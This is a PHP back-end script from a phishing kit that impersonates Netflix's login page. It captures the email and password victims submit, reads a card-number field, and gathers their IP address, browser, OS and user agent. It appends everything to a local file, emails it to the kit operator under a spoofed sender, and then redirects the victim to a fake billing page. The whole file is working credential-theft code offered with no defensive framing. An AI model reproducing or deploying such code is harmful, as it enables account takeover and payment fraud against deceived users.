<?php
$ip = getenv("REMOTE_ADDR");
include '../options/get_browser.php';
include '../settings/email.php';
$message .= "====================<[ Netflix Login ]>====================\n";
$message .= "# Email Address       : ".$_POST['userLoginId']."\n";
$message .= "# Password            : ".$_POST['password']."\n";
$message .= "====================<[ Personal Information ]>====================\n";
$message .= "# IP Address          : ".$ip."\n";
$message .= "# Browser             : ".$browser."\n";
$message .= "# System              : ".$os."\n";
$message .= "# User Agnet          : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "====================<[ Thanks by ArtCode ]>====================\n";
$cc = $_POST['ccn'];
$subject = "🖤 Netflix Login Information: [ $os - $browser - $ip ] ";
$headers = 'From: Martin <newlog@martin-flix.onion>' . "\r\n" .
$file = fopen("../stored.txt", 'a');
fwrite($file, $message);
mail($send,$subject,$message,$headers);

header("Location: ../ref-billing.php");?>